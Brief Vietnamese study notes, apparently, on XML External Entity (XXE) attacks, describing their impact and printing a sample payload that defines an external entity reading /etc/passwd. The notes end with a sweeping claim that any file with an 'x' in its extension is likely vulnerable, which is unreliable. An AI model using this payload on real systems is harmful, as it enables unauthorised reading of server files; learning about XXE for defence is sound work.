# XXE
#### Là một dạng tấn công nhắm vào các ứng dụng xử lý dữ liệu XML. Đây là một lỗ hổng khá nghiêm trọng, cho phép kẻ tấn công đọc các tệp tin nhạy cảm trên máy chủ, thực hiện tấn công từ chối dịch vụ (DoS), hoặc thậm chí quét mạng nội bộ.
#### <?xml version="1.0" encoding="UTF-8"?>
#### <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
#### <data>&xxe;</data>
#### Nhũng file có chữ x trong đuôi đều có khả năng bị xxe
